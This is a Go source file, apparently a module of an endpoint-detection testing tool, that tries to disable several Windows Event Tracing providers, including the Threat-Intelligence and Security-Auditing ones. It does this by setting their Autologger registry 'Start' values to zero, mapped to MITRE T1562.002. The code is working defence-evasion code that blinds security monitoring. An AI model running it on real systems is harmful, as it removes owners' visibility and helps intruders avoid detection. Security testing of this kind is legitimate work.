//go:build windows

package modules

import (
	"agentide/core"
	"golang.org/x/sys/windows/registry"
	"time"
)

// disableETWModule attempts to disable ETW (Event Tracing for Windows) providers
// by modifying the Autologger registry keys. This tests if the EDR monitors
// tampering with Windows Event Tracing providers.
type disableETWModule struct {
	logger *core.Logger
	cfg    *core.Config
}

func (m *disableETWModule) Name() string { return "disable_etw" }

func (m *disableETWModule) Run() RawResult {
	start := time.Now()
	result := RawResult{
		ModuleName: m.Name(),
		MitreID:    "T1562.002", // Disable Windows Event Logging
		Action:     "Attempt to disable ETW providers via registry modification",
	}

	// List of critical ETW providers that EDRs often rely on for telemetry
	etwProviders := []struct {
		name        string
		autologger  string
		description string
	}{
		{
			name:        "Microsoft-Windows-Threat-Intelligence",
			autologger:  "Microsoft-Windows-Threat-Intelligence",
			description: "Microsoft Threat Intelligence ETW provider",
		},
		{
			name:        "Microsoft-Windows-Kernel-Process",
			autologger:  "Circular Kernel Context Logger",
			description: "Kernel Process ETW provider",
		},
		{
			name:        "Microsoft-Windows-Kernel-Image",
			autologger:  "Circular Kernel Context Logger",
			description: "Kernel Image Load ETW provider",
		},
		{
			name:        "Microsoft-Windows-Kernel-Thread",
			autologger:  "Circular Kernel Context Logger",
			description: "Kernel Thread ETW provider",
		},
		{
			name:        "Microsoft-Windows-Security-Auditing",
			autologger:  "Security-Auditing",
			description: "Security Auditing ETW provider",
		},
	}

	disabledCount := 0
	var details []string

	for _, provider := range etwProviders {
		// Try to disable via Autologger registry key
		autologgerPath := `SYSTEM\CurrentControlSet\Control\WMI\Autologger\` + provider.autologger
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, autologgerPath, registry.ALL_ACCESS)
		if err != nil {
			m.logger.Debug("ETW autologger key not found", map[string]interface{}{
				"provider": provider.name,
				"path":     autologgerPath,
				"error":    err.Error(),
			})
			continue
		}

		// Snapshot the original Start value before overwriting it, so the
		// endpoint's ETW configuration is restored after the assessment.
		snapshotDWORD(autologgerPath, "Start")

		// Try to disable by setting Start = 0 (disabled)
		err = k.SetDWordValue("Start", 0)
		if err != nil {
			m.logger.Debug("Failed to disable ETW provider", map[string]interface{}{
				"provider": provider.name,
				"error":    err.Error(),
			})
			k.Close()
			continue
		}

		// Verify it worked
		val, _, err := k.GetIntegerValue("Start")
		k.Close()

		if err == nil && val == 0 {
			disabledCount++
			details = append(details, provider.description+" disabled")
			m.logger.Info("ETW provider disabled", map[string]interface{}{
				"provider":   provider.name,
				"autologger": provider.autologger,
			})
		} else {
			details = append(details, provider.description+" resisted")
		}
	}

	result.ElapsedMs = time.Since(start).Milliseconds()

	if disabledCount > 0 {
		result.Notes = "ETW providers disabled: " + joinStrings(details, "; ")
		result.OSFeedback.ProcessKilled = false
		result.OSFeedback.AccessDenied = false
	} else {
		result.Notes = "No ETW providers could be disabled; all resisted"
		result.OSFeedback.AccessDenied = true
	}

	return result
}
